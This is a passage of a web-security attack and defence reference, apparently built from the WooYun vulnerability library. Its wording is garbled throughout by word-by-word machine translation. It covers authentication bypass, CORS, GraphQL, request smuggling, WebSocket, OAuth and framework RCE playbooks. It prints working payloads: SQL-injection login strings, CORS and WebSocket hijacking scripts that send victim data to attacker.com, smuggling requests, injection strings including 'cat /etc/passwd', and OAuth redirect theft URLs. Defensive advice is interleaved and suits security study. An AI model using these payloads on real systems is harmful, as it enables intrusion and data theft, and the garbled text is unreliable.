time戳/sequentialnumbergenerate's/ofweakSession -> canpredictdescendone (counter)Session
```

### 5.9 ten thousandcanPassword(SQL Injectionlogin)

```
user name: ' or 1=1--
Password:   anymeaning/intent

user name: admin'--
Password:   anymeaning/intent
```

### 5.10 AuthenticationbypassTestclearsingle

| Testitem | method | tool |
|--------|------|------|
| CookieForge | Modifyuseridentifierword paragraph/segment | BurpSuite |
| Sessionfixed |  repeat useother人Session | Packet Capture Tool |
| responseTamper | Modifyreturnsstatecode | BurpSuite |
| IPForge | AddX-Forwarded-For | curl/Burp |
| Frontendbypass | ModifyJSlogic | DevTools |
| JWTTamper | emptyAlgorithm/weakKey | jwt.io/hashcat |
| Pathbypass | largesmallwrite/Encoding/截break/judge | Manual+Dictionary |
| weak口 make | defaultCredentialattempt | Hydra |
| SQL Injectionlogin | ten thousandcanPassword | Manual |

### 5.11 defensemeasure

| layer面 | measure |
|------|------|
| network | intranet/internal networkServicenotExpose公network，VPN/堡垒machineAccess |
| Authentication | mandatory repeatmixedPassword，Disabledefaultaccount，EnableMFA |
| Authorization | BackendeveryinterfacevalidatePermission，mostsmallPermissionprinciple |
| Session | login after/back re-/heavynewgenerateSessionID，HttpOnly+Secure |
| Monitor | Exceptionlogin告警，failure next/timenumberlock，LogAudit |
| hardening | Disable/OffDebuginterface，Deletedefaultmanagepage |

---

## six、system-izeTestFramework

### 6.1 fourphase/stageTest method/law

```
Phase 1: Intelligence Gathering
  - Enumerationplacehas/havemeritcanpointand/withinterface
  - 绘make/control业务processGraph
  - identifySensitiveoperation(支付/Reset/Permissionchange)
  - determinesparameter's/ofcancontrolproperty/nature

Phase 2: Threat Modeling
  - Analysiseachinterface's/ofinputenterparameterand/withtrustboundary/perimeter
  - markServiceend(side) vs Frontendvalidate
  - buildattackTree(press/according toexceedright/支付/Authenticationclassification)
  - PrioritySort(highimpact x highcancanproperty/nature)

Phase 3: Vulnerability Verification
  - press/according toPriority逐itemTest
  - Log/RecordPoC(request/response截Graph)
  - assessmentImpact Scope(dataquantity/measure/usernumber/Amount)

Phase 4: Reportinputexit
  - vulnerabilitydescription+ repeatpresentstep
  -  (classifier) becauseAnalysis+impactassessment
  - repair/fixRecommendation(short期+grow期)
  - riskassesslevel/grade(CVSS)
```

### 6.2 high频vulnerabilitypatternquick reference

| vulnerabilitypattern | detectionSignal | fastspeed/fastValidatemethod |
|----------|----------|-------------|
| IDOR | URL/parametercontain/include自increaseID | ReplaceIDlook/seeisno/notreturnsother人data |
| AmountTamper | requestcontain/includeprice/amount | 改for/is0.01observeOrder |
| Validatecodereturnshow/display | send/issueValidatecode after/backgrab/capturePackage | Searchresponsemiddle/center4-6bitnumber |
| stepskips | multi/multiplestepprocess | directreceive/connectAccess after/back续stepURL |
| responseTamper | Clientaccording tostatusjump转 | 改status=1look/seeisno/notAllow Through |
| unauthorized after/back (classifier for machines) | DirectoryScanningdiscovermanagePath | directreceive/connectAccesslook/seeisno/notneedlogin |
| weak口 make | discoverlogin页 | attemptadmin/adminetc.defaultCredential |
| condition竞争 | Balance/Libraryexist/Couponoperation | Concurrent50+requestobserveisno/notmulti/multiple扣 |

### 6.3 solid战toolRecommendation

| tool | core use途 | 适 usescenario |
|------|----------|----------|
| BurpSuite | Streamquantity/measureIntercept、parameterTamper、Replay | all/fullscenariocoretool |
| Postman | APITest、Batchrequest | interfacelogicTest |
| Hydra | Passwordbrute force | weak口 make/撞Library |
| OWASP ZAP | Automatic-izeScanning | 初步discover |
| customfootthis | ConcurrentTest、IDtraverse/iterate | Race Condition/IDOR |

---

*documentversion: v1.0*
*datacomeSource: WooYunvulnerabilityLibrary(88,636 (classifier)): logicdefect/flaw(8,292 (classifier))+Unauthorized Access(14,377 (classifier))*
*generatetime: 2026-02-06*

## References — web-modern-protocols

# presentgeneration/proxyWebProtocolsecurity

> **comeSource**: based onWooYunvulnerabilityLibrary、OWASP及业boundarysecuritypracticerefine，涵stampCORS、GraphQL、HTTPwalk私、WebSocket、OAuthfivelargepresentgeneration/proxyWebProtocolAttack Surface。
> **methodology**: WooYunvulnerabilitythis质公 style/mode + L1-L4system-izeAnalysis

---

## one、CORSerror/mistakeconfiguration

### 1.1 vulnerabilitythis质

```
CORSrisk = Access-Control-Allow-Originconfiguration past/excessivewide × Sensitiveinterfacelacksextraoutauthentication
```

BrowserSame-Origin Policythisissecurity屏障，CORSerror/mistakeconfigurationwill/shallits/their打破，allowsmaliciousstandpointCross-DomainReaduserSensitivedata。

### 1.2 detectionmethod

```bash
# foundation/basisdetection: SendcustomOriginobserveresponse
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# Inspect/Checkresponsehead/top:
# Access-Control-Allow-Origin: https://evil.com  → danger险!
# Access-Control-Allow-Credentials: true          → cancarrybring/carryCookieCross-Domainrequest
```

**danger险configurationpattern**

| pattern | risk | explanation |
|------|------|------|
| `Access-Control-Allow-Origin: *` | high | commonmatchsymbol/character，anymeaning/intentdomaincanRead(但notcanbring/carryCookie) |
| dynamicnegative/reverse射Origin | extremehigh | will/shallrequestOrigindirectreceive/connect as/dofor/isresponsehead/topreturns |
| `null` Originallows | high | `<iframe sandbox>`canconstructnullcomeSource |
| correct/positive rule/principleMatchdefect/flaw | high | `evil.com.attacker.com`Match`evil.com` |
| 子domaincommonmatch | middle/center | `*.target.com`contain/includealreadylosscontrol's/of子domain |

### 1.3 exploitway/manner

```html
<!-- maliciouspage: Cross-Domain窃take/getuserdata -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- null Originexploit -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 defensemeasure

- **严format/grid白 namesinglevalidateOrigin**：do notdynamicnegative/reverse射，useexactMatchcolumntable
- Avoid`Access-Control-Allow-Origin: *`and/with`Access-Control-Allow-Credentials: true`simultaneouslyuse
- Avoidallows`null` Origin
- correct/positive rule/principleMatchmust锚define(^and$)，Prevent子串Matchbypass
- SensitiveinterfaceincreaseCSRF Tokenetc.extraoutauthentication，notonlydepend onCORS

---

## two、GraphQLsecurity

### 2.1 vulnerabilitythis质

```
GraphQLrisk = stronglarge's/ofquerycan力 × default openrelease/put's/ofinner/inside省machinemake/control × lacksfine粒degree/measureauthentication
```

GraphQLsingleoneend(side)pointExposealldatamodule type，inner/inside省machinemake/controlprovide completewhole/integerAPIdocument，Attackerno/without需guessinterface。

### 2.2 inner/inside省query - informationLeak/Disclosure

```graphql
# Get completewhole/integerSchema（type、word paragraph/segment、parameter）
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# 精simple版：onlyGetquerytype
{__schema{queryType{name,fields{name}}}}

# Getmutationcolumntable
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 commonattackVector

**Injectattack**

```graphql
# parameterjoinreceive/connectleads toSQL Injection
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL Injection
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**BatchqueryDoS（嵌setquery耗尽resourceSource）**

```graphql
# deepdegree/measure嵌set - 指numberlevel/gradeDatabasequery
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# part nameBatchquery - single next/timerequestEnumerationlargequantity/measuredata
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# Batchmutationbrute force cracking
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**Authenticationbypass**

```graphql
# mutationmissingauthenticationInspect/Check
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 defensemeasure

- **Disablegenerate/liveproduceenvironmentinner/inside省query**：Inspect/Check`__schema`/`__type`request并rejects
- querydeepdegree/measurelimitation(Recommendationmostlarge10layer)and/with repeatmixeddegree/measureAnalysis
- speed/fast率limitationand/withqueryTimeout(防Batch/嵌setDoS)
- word paragraph/segmentlevel/gradePermissioncontrol(eachresolverindependentauthentication)
- inputenterparameter-izeprocess/handle(防Inject)、Prohibitstringjoinreceive/connectbuildquery
- usePersistencequery(Persisted Queries)，onlyallows预register's/ofqueryExecute

---

## three、HTTP Request Smuggling

### 3.1 vulnerabilitythis质

```
FrontendProxy(CDN/LB) and/with BackendServer  for/toHTTPrequestboundary/perimeter's/ofparsingnotone致
→ one (counter)TCPConnectionmiddle/center"walk私"(past tense)extraout's/ofrequest → impactotheruser's/ofrequestprocess/handle
```

core矛盾：`Content-Length`(CL) and/with `Transfer-Encoding: chunked`(TE) simultaneouslyexistat/intime， before/frontBackendselectnotsame/together's/ofheaderadvancerowparsing。

### 3.2 three kind/typeattacktype

| type | Frontendparsing | Backendparsing | explanation |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | Frontendpress/according toCLForwarding，Backendpress/according toTEparsing |
| TE.CL | Transfer-Encoding | Content-Length | Frontendpress/according toTEForwarding，Backendpress/according toCLparsing |
| TE.TE | Transfer-Encoding | Transfer-Encoding | ObfuscationTEhead/top makeonedirectionignores |

### 3.3 经典Payload

**CL.TEwalk私**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CLwalk私**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TEObfuscation变body**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 detectionand/withexploit

```
detectionmethod:
1. SendCL/TEConflictrequest，observeTimeout/responseException
2. walk私one (counter)not completewhole/integerrequest，look/see after/back续requestisno/notreceiveimpact
3. tool: Burp Suite HTTP Request SmugglerExtension

exploitscenario:
- bypassFrontendWAF/ACL → walk私maliciousrequest toBackend
- Hijackotheruserrequest → 窃take/getCookie/Session
- cache投毒 → walk私request污染CDNcachecontent
- requestRouteHijack → will/shallrequestguide to/towardsanymeaning/intentBackend
```

### 3.5 defensemeasure

-  before/frontBackenduse统one's/ofHTTPparsingLibrary/version
- ProhibitsimultaneouslyexitpresentCLandTEhead/top，rejectsfuzzy/blurrequest
- DisableHTTP/1.0 Keep-AliveBackendConnection repeat use
- Upgrade toHTTP/2(Binary帧Protocol，天然免疫CL/TE歧义)
- CDN/LBconfigurationspecification-izeRequest Header after/back againForwarding

---

## four、WebSocketsecurity

### 4.1 vulnerabilitythis质

```
WebSocketrisk = HTTPgrasp手 after/back脱leavetransmit统securitymodule type × hold久double to/towardscommon道lacks逐messageauthentication
```

WebSocketConnectionone旦establishes， after/back续messagenot again经 past/excessivestandardHTTPsecuritymachinemake/control(Cookie SameSite/CSRF Tokenetc.)。

### 4.2 跨standWebSocketHijack(CSWSH)

```html
<!-- maliciouspage: HijackuserWebSocketConnection -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  //  with/byVictimIdentitySendrequest
};
ws.onmessage = function(e) {
    // 窃take/getresponsedata
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**original principle/logic**：WebSocketgrasp手isstandardHTTPrequest，Browserwill/canAutomaticcarrybring/carryCookie。若Serviceend(side)notValidateOriginhead/top，maliciouspagecanestablishes经 past/excessiveAuthentication's/ofwsConnection。

### 4.3 messageInject

```javascript
// via/throughWebSocketSendInjectpayload
ws.send('{"query": "admin\' OR 1=1--"}');          // SQL Injection
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // Command Injection
```

### 4.4 Authenticationnot足

| issue/problem | risk | explanation |
|------|------|------|
| onlygrasp手timeAuthentication | Session past/excessive期 after/backConnection仍has/have效 | wsConnectioncancontinuousnumbersmalltime |
| no/withoutmessagelevel/gradeauthentication | anyalreadyConnectionClientcanExecutealloperation | lacksper-messageAuthorizationInspect/Check |
| TokenPlaintexttransmitinput | WebSocketnotEncryption(ws://) | usewss://mandatoryEncryption |

### 4.5 defensemeasure

- **ValidateOriginhead/top**：grasp手timeInspect/CheckOriginisno/notat/in白 namesingleinner/inside(防CSWSH)
- **Tokenauthentication**：grasp手timevia/throughURLparameterorfirst/head (classifier)messagetransmitpassToken(notdepend onCookie)
- **messagevalidate**： for/toevery (classifier)message doInput ValidationandOutput Encoding(防Inject)
- usewss://mandatoryEncryptiontransmitinput
- ImplementationHeartbeatmachinemake/controlandSessionTimeoutAutomaticDisconnect
- messagespeed/fast率limitation(防DoS)

---

## five、OAuth 2.0/OIDCsecurity

### 5.1 vulnerabilitythis质

```
OAuthrisk =  repeatmixed's/ofmulti/multipledirectioninteractiveprocess × parametervalidatenot严format/grid × Implementation偏leavespecification
```

OAuthAuthorizationprocessinvolvesClient、AuthorizationServer、resourceSourceServerthreedirectioninteractive，anyone环configurationnotwhenallcanleads toTokenLeak/Disclosureoraccountreceive/connect管。

### 5.2 redirect_urioperate纵

```
# normalprocess
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# attack: Tamperredirect_uri窃take/getAuthorizationcode
redirect_uri=https://attacker.com/steal           #  completeall/fullReplace
redirect_uri=https://app.com.attacker.com/callback # 子domainObfuscation
redirect_uri=https://app.com/callback/../../../attacker # Pathtraverse/iterate
redirect_uri=https://app.com/callback?next=https://attacker.com # Open Redirectchain
```

### 5.3 commonattackVector

| attacktype | original principle/logic | exploitcondition |
|----------|------|----------|
| CSRFattack | stateparameterabsentorcanpredict | will/shallAttackeraccountBind toVictim |
| TokenLeak/Disclosure(Referer) | 隐 style/modepatterntokenat/inURL Fragmentmiddle/center | pagecontain/includeExternalresourceSourcecitation |
| TokenLeak/Disclosure(Log) | Authorizationcode/tokenLog/Recordat/inServiceend(side)Log | LogcanAccess |
| PKCEbypass | 公together/shareClientun-usecode_challenge | InterceptAuthorizationcodei.e.can换take/gettoken |
| IdPObfuscation(Mix-Up) | multi/multipleIdPscenariodescendObfuscationAuthorizationresponsecomeSource | Clientsupportsmulti/multiple (counter)OAuthprovide商 |
| AuthorizationcodeReplay | Authorizationcodeun-one next/timeproperty/natureuse | InterceptAuthorizationcode after/back re-/heavy repeat兑换 |

### 5.4 CSRFand/withstateparameter

```
# attackprocess (stateabsenttime)
1. Attackersend/issuestartOAuthAuthorization，Get自己account's/ofAuthorizationcode
2. constructlink: https://app.com/callback?code=ATTACKER_CODE
3. 诱骗Victimpoint击 → VictimaccountBindAttacker's/ofNo.threedirectionaccount
4. Attacker useNo.threedirectionaccountlogin → receive/connect管Victimaccount

# defense: stateparameter
state=followmachinenotcanpredictvalue(BinduserSession)
→ return调timevalidatestateand/withSessionMatch
```

### 5.5 隐 style/modepatternrisk

```
# 隐 style/modepattern(Implicit Flow) - alreadynotRecommendation
https://app.com/callback#access_token=eyJ...&token_type=bearer

risk:
- Tokenat/inURL Fragmentmiddle/center，canby (passive)Browserhistorical/Refererhead/topLeak/Disclosure
- cannotuserefresh_token，userbody验difference
- cannotBindClientIdentity(no/withoutclient_secret)

→ 替generation/proxysolution: Authorization Code Flow + PKCE
```

### 5.6 defensemeasure

- **严format/gridredirect_uri白 namesingle**：exactMatch(notallowscommonmatchsymbol/character/子Path)
- **mandatorystateparameter**：BindSession、notcanpredict、one next/timeproperty/natureuse
- **mandatoryPKCE**：placehas/haveClient(尤its/their公together/shareClient/SPA)mustusecode_challenge
- useAuthorization Code Flow，弃 useImplicit Flow
- Authorizationcodeone next/timeproperty/natureuse，shorthas/have效期(Recommendation10 part/point钟inner/inside)
- TokenBind(DPoP/mTLS)PreventTokenby (passive)盗 use
- regularAuditauthorized's/ofNo.threedirectionshould useandPermission范围

---

*based onWooYunvulnerabilityLibrary(88,636 (classifier))refine + OWASP/RFCsecuritystandard | only供security研究and/withdefensereference*

## References — web-playbook-01-clickjacking

# point击Hijack
English: Clickjacking
- Entry Count: 2
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## foundation/basispoint击Hijack
- ID: clickjacking-basic
- Difficulty: beginner
- Subcategory: foundation/basis
- Tags: clickjacking, ui-redressing, iframe
- Original Extracted Source: original extracted web-security-wiki source/clickjacking-basic.md
Description:
via/through透brightiframe覆stamp诱useuser/accountat/innotknow情's/of情况descendpoint击hide/conceal's/ofmaliciousbuttonorlink
Prerequisites:
- goal/targetstandpointallowsby (passive)iframe嵌set
- goal/targetun-settingX-Frame-Optionsresponsehead/top
- goal/targetun-configurationCSP frame-ancestorsstrategy
- HTML/CSSfoundation/basisknowknow
Execution Outline:
1. detectionX-Frame-OptionsandCSP
2. foundation/basis透brightiframe覆stampPOC
3. multi/multiplestepdragHijack(Drag-and-Drop)
4. exploitCSS pointer-eventsbypass
## point击Hijack+XSS
- ID: clickjacking-xss
- Difficulty: intermediate
- Subcategory: XSS
- Tags: clickjacking, xss
- Original Extracted Source: original extracted web-security-wiki source/clickjacking-xss.md
Description:
will/shallpoint击Hijackand/withXSSattacktie/knotcombine， firstvia/throughpoint击HijacktriggerXSSattackVectorGet更deeplayer's/ofcontrol
Prerequisites:
- goal/targetexistat/inXSSvulnerability
- goal/targetallowsby (passive)iframe嵌set
- XSS payloadcanby (passive)point击trigger
Execution Outline:
1. identifycanexploit's/ofXSSandClickjackingcombination
2. Self-XSS + Clickjackingcombinationexploit
3. negative/reverse射 typeXSS + iframe嵌setexploit

## References — web-playbook-02-supply-chain-attacks

# Supply Chain Attack
English: Supply Chain Attacks
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## NPMPackage name仿冒(Typosquatting)
- ID: supply-typosquat
- Difficulty: intermediate
- Subcategory: Packagemanagedevice投毒
- Tags: 供shouldchain, NPM, Typosquatting, Package投毒, postinstall
- Original Extracted Source: original extracted web-security-wiki source/supply-typosquat.md
Description:
via/throughregisterand/withStreamrowNPMPackage namehighdegree/measure相似's/ofmaliciousPackage(like/such aslodash→1odash, colors→co1ors)，诱guide opensend/issue者errorInstallation。maliciousPackageat/ininstall/postinstall钩子middle/centerExecuteReverseShell、窃take/getenvironmentvariableor植enterBackdoor。
Prerequisites:
- NPMaccount
- (past tense)untie/solvegoal/targetitemeye/lookdepend on
- maliciousPackagefoundation/basisset up施
Execution Outline:
1. 1. Reconnaissancegoal/targetdepend on
2. 2. generate仿冒Package name
3. 3. constructmaliciousPackage
4. 4. detectionand/withtake/get证
## CI/CDPipe投毒
- ID: supply-ci-poison
- Difficulty: advanced
- Subcategory: CI/CDattack
- Tags: 供shouldchain, CI/CD, GitHub Actions, Jenkins, Pipeline
- Original Extracted Source: original extracted web-security-wiki source/supply-ci-poison.md
Description:
via/throughmaliciousPull Request、ActionsInjectorbuildfootthisTampercomeattackCI/CDPipe。Attackercan窃take/getbuildKey、投毒buildproduce物orat/indeploymentprocessmiddle/center植enterBackdoorcode。
Prerequisites:
- goal/targetusePublicCI/CD
- canCommitPRorFork
Execution Outline:
1. 1. identifyCI/CDconfiguration
2. 2. PRtrigger's/ofWorkflowInject
3. 3. Actionstablereach style/modeInject
4. 4. buildproduce物投毒
## depend onObfuscationattack
- ID: supply-dependency-confusion
- Difficulty: intermediate
- Subcategory: depend onObfuscation
- Tags: 供shouldchain, depend onObfuscation, NPM, PyPI, Dependency Confusion
- Original Extracted Source: original extracted web-security-wiki source/supply-dependency-confusion.md
Description:
exploitPackagemanagedeviceat/in公together/shareRegistryandPrivateRegistrybetween's/ofparsingPriorityvulnerability。when企业useInternalPackage nametime，Attackerat/in公together/shareNPM/PyPIregister更highversionnumber's/ofsame/together namePackage，Packagemanagedevicewill/canadvantage firstInstallation公together/sharehighversionPackagetherebyExecutemaliciouscode。
Prerequisites:
- Knowngoal/targetInternalPackage name
- 公together/shareRegistryaccount
Execution Outline:
1. 1. discoverInternalPackage name
2. 2. at/in公together/shareRegistryregistersame/together namePackage
3. 3. MonitorDNSreturn调AcknowledgmentHit
4. 4. impactassessmentand/withReport

## References — web-playbook-03-cache-and-cdn-security

# cacheand/withCDNsecurity
English: Cache & CDN Security
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## cache投毒
- ID: cache-poisoning
- Difficulty: advanced
- Subcategory: cache投毒
- Tags: cache, poisoning, web-cache
- Original Extracted Source: original extracted web-security-wiki source/cache-poisoning.md
Description:
Webcache投毒attack
Prerequisites:
- goal/targetusecache
- cachekeyconfigurationnotwhen
Execution Outline:
1. detect/probecache
2. un-keyenterhead/top
3. cache投毒
4. Fat GET
## cacheSpoof
- ID: cache-deception
- Difficulty: intermediate
- Subcategory: Deception
- Tags: cache, deception, auth
- Original Extracted Source: original extracted web-security-wiki source/cache-deception.md
Description:
exploitWebcacheandServerPathparsing's/ofdifference，诱guideCDN/cachelayercacheincludes/containsSensitiveinformation's/ofdynamicpage
Prerequisites:
- goal/targetuseCDNorReverse Proxycache
- Pathparsingexistat/indifference(BackendignoresPath after/back缀)
- cachestrategybased onURLExtension name
Execution Outline:
1. detect/probecacherowfor/is
2. PathObfuscationcacheSpoof
3. highlevel/gradecacheSpoof变body
4.  completewhole/integerattackprocessValidate
## CDNbypass
- ID: cdn-bypass
- Difficulty: intermediate
- Subcategory: CDN
- Tags: cdn, bypass, recon
- Original Extracted Source: original extracted web-security-wiki source/cdn-bypass.md
Description:
bypassCDNFindtruesolidIP
Prerequisites:
- goal/targetuseCDN
Execution Outline:
1. historicalDNS
2. 邮 (classifier)head/top
3. DNShistoricaland/withCertificatetransparencyquery
4. 子Domain Nameand/with相 close/shutServicedetect/probetruesolidIP

## References — web-playbook-04-open-redirect

# Open Redirect
English: Open Redirect
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## foundation/basisOpen Redirect
- ID: redirect-basic
- Difficulty: beginner
- Subcategory: foundation/basis
- Tags: redirect, url, phishing
- Original Extracted Source: original extracted web-security-wiki source/redirect-basic.md
Description:
URLjump转Vulnerability Exploitation
Prerequisites:
- goal/targetparametercontroljump转address
Execution Outline:
1. directreceive/connectjump转
2. bypassValidate
3. 斜杠bypass
##  re-/heavydefine to/towardsbypass
- ID: redirect-bypass
- Difficulty: intermediate
- Subcategory: Bypass
- Tags: redirect, bypass
- Original Extracted Source: original extracted web-security-wiki source/redirect-bypass.md
Description:
Open Redirectbypasstip/trick
Prerequisites:
- existat/in re-/heavydefine to/towardsparameter
Execution Outline:
1. URLEncoding
2. @symbol
3. negative/reverse斜杠
##  re-/heavydefine to/towards toSSRF
- ID: redirect-ssrf
- Difficulty: intermediate
- Subcategory: SSRF
- Tags: redirect, ssrf
- Original Extracted Source: original extracted web-security-wiki source/redirect-ssrf.md
Description:
exploitOpen Redirectvulnerability as/dofor/isjump板will/shallSSRFdetect/probelead/guideguide toInternalnetwork，bypassSSRF's/ofURL白 namesingle/黑 namesinglelimitation
Prerequisites:
- goal/targetexistat/inOpen Redirect(Open Redirect)vulnerability
- goal/targetexistat/inSSRFmeritcanpoint(URLparameter/Webhooketc.)
- SSRFFilteronlyInspect/CheckinitialURL而notTrace re-/heavydefine to/towards
Execution Outline:
1. identifyOpen Redirectpoint
2. via/through re-/heavydefine to/towardsbypassSSRFFilter
3. shortlinkandDNS re-/heavyBindsupplementary
4.  completewhole/integerexploitchain:  re-/heavydefine to/towards→SSRF→intranet/internal networkdetect/probe

## References — web-playbook-05-framework-vulnerabilities

# Frameworkvulnerability
English: Framework Vulnerabilities
- Entry Count: 18
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## Log4j RCE (Log4Shell)
- ID: log4j-rce
- Difficulty: intermediate
- Subcategory: Log4j
- Tags: log4j, rce, cve-2021-44228, log4shell
- Original Extracted Source: original extracted web-security-wiki source/log4j-rce.md
Description:
Apache Log4jRemoteCode Execution Vulnerability
Prerequisites:
- useLog4j 2.xversion
- userinputenterby (passive)Log/Record toLog
Execution Outline:
1. 1. detect/probevulnerability
2. 2. DNSoutbring/carryTest
3. 3. constructmaliciousLDAPServer
4. 4. GetShell
## Spring Actuatorvulnerability
- ID: spring-actuator
- Difficulty: intermediate
- Subcategory: Spring
- Tags: spring, actuator, rce, java
- Original Extracted Source: original extracted web-security-wiki source/spring-actuator.md
Description:
Spring Boot Actuatorend(side)pointsecurityvulnerability
Prerequisites:
- Spring Bootshould use
- Actuatorend(side)pointExpose
Execution Outline:
1. 1. detect/probeActuatorend(side)point
2. 2. GetSensitiveinformation
3. 3. DownloadHeapDump
4. 4. envend(side)pointRCE
## Fastjson RCE
- ID: fastjson-rce
- Difficulty: advanced
- Subcategory: Fastjson
- Tags: fastjson, rce, deserialization, java
- Original Extracted Source: original extracted web-security-wiki source/fastjson-rce.md
Description:
Alibaba FastjsonDeserializationRemote Code Execution
Prerequisites:
- useFastjsonLibrary
- existat/inDeserializationpoint
Execution Outline:
1. 1. detect/probeFastjson
2. 2. JNDIInject
3. 3. 搭buildmaliciousService
4. 4. bypassAutoTypeInspect/Check
## Spring SpELInject
- ID: spring-spel
- Difficulty: intermediate
- Subcategory: Spring SpEL
- Tags: spring, spel, expression, rce
- Original Extracted Source: original extracted web-security-wiki source/spring-spel.md
Description:
Springtablereach style/mode language speech/languageInjectattack
Prerequisites:
- useSpringFramework
- existat/inSpELInjectpoint
Execution Outline:
1. 1. detect/probeSpELInject
2. 2. commandExecute
3. 3. FileRead
4. 4. DNSoutbring/carry
## Spring Cloudvulnerability
- ID: spring-cloud
- Difficulty: advanced
- Subcategory: Spring Cloud
- Tags: spring, cloud, rce, deserialization
- Original Extracted Source: original extracted web-security-wiki source/spring-cloud.md
Description:
Spring Cloud相 close/shutVulnerability Exploitation
Prerequisites:
- useSpring Cloud
- existat/invulnerabilityversion
Execution Outline:
1. 1. Spring Cloud Gateway RCE
2. 2. Spring Cloud Function SpEL
3. 3. Spring Cloud Netflix
## Struts2Remote Code Execution
- ID: struts2-rce
- Difficulty: intermediate
- Subcategory: Struts2
- Tags: struts2, rce, java, apache
- Original Extracted Source: original extracted web-security-wiki source/struts2-rce.md
Description:
Apache Struts2FrameworkRCEvulnerability
Prerequisites:
- useStruts2Framework
- existat/invulnerabilityversion
Execution Outline:
1. 1. S2-045vulnerability
2. 2. S2-046vulnerability
3. 3. S2-057vulnerability
4. 4. S2-061/S2-062vulnerability
## Struts2 OGNLtablereach style/modeInject
- ID: struts2-ognl
- Difficulty: advanced
- Subcategory: Struts2 OGNL
- Tags: struts2, ognl, expression, injection
- Original Extracted Source: original extracted web-security-wiki source/struts2-ognl.md
Description:
Struts2 OGNLtablereach style/modeInjecttechnique详untie/solve
Prerequisites:
- useStruts2Framework
- existat/inOGNLInjectpoint
Execution Outline:
1. 1. OGNLfoundation/basis language method/law
2. 2. bypasssecuritylimitation
3. 3. commandExecutetip/trick
4. 4. Fileoperation
## WebLogicRemote Code Execution
- ID: weblogic-rce
- Difficulty: advanced
- Subcategory: WebLogic
- Tags: weblogic, rce, java, oracle
- Original Extracted Source: original extracted web-security-wiki source/weblogic-rce.md
Description:
Oracle WebLogic Server RCEvulnerability
Prerequisites:
- useWebLogic Server
- existat/invulnerabilityversion
Execution Outline:
1. 1. CVE-2017-10271
2. 2. CVE-2019-2725
3. 3. CVE-2020-14882
## WebLogic T3Protocolattack
- ID: weblogic-t3
- Difficulty: advanced
- Subcategory: WebLogic T3
- Tags: weblogic, t3, deserialization, java
- Original Extracted Source: original extracted web-security-wiki source/weblogic-t3.md
Description:
WebLogic T3ProtocolDeserialization Vulnerability
Prerequisites:
- WebLogic openrelease/putT3Port
- existat/invulnerabilityversion
Execution Outline:
1. 1. detect/probeT3Service
2. 2. usetoolattack
3. 3. constructmaliciousT3request
## WebLogic IIOPProtocolattack
- ID: weblogic-iiop
- Difficulty: advanced
- Subcategory: WebLogic IIOP
- Tags: weblogic, iiop, deserialization, corba
- Original Extracted Source: original extracted web-security-wiki source/weblogic-iiop.md
Description:
WebLogic IIOPProtocolDeserialization Vulnerability
Prerequisites:
- WebLogic openrelease/putIIOPPort
- existat/invulnerabilityversion
Execution Outline:
1. 1. detect/probeIIOPService
2. 2. CVE-2020-2551
3. 3. constructIIOPrequest
## ThinkPHPRemote Code Execution
- ID: thinkphp-rce
- Difficulty: intermediate
- Subcategory: ThinkPHP
- Tags: thinkphp, rce, php, framework
- Original Extracted Source: original extracted web-security-wiki source/thinkphp-rce.md
Description:
ThinkPHPFrameworkRCEvulnerability
Prerequisites:
- useThinkPHPFramework
- existat/invulnerabilityversion
Execution Outline:
1. 1. ThinkPHP 5.x RCE
2. 2. ThinkPHP 5.1.x RCE
3. 3. ThinkPHP 5.0.23 RCE
4. 4. Information Gathering
## LaravelRemote Code Execution
- ID: laravel-rce
- Difficulty: intermediate
- Subcategory: Laravel
- Tags: laravel, rce, php, framework
- Original Extracted Source: original extracted web-security-wiki source/laravel-rce.md
Description:
LaravelFrameworkRCEvulnerability
Prerequisites:
- useLaravelFramework
- existat/invulnerabilityversionorconfiguration
Execution Outline:
1. 1. CVE-2021-3129
2. 2. DebugpatterninformationLeak/Disclosure
3. 3. .envFileLeak/Disclosure
4. 4. APP_KEYexploit
## Apache ShiroDeserialization
- ID: shiro-deserialize
- Difficulty: intermediate
- Subcategory: Apache Shiro
- Tags: shiro, deserialization, java, rememberme
- Original Extracted Source: original extracted web-security-wiki source/shiro-deserialize.md
Description:
Apache Shiro RememberMeDeserialization Vulnerability
Prerequisites:
- useApache Shiro
- existat/invulnerabilityversion
Execution Outline:
1. 1. detectionShiro
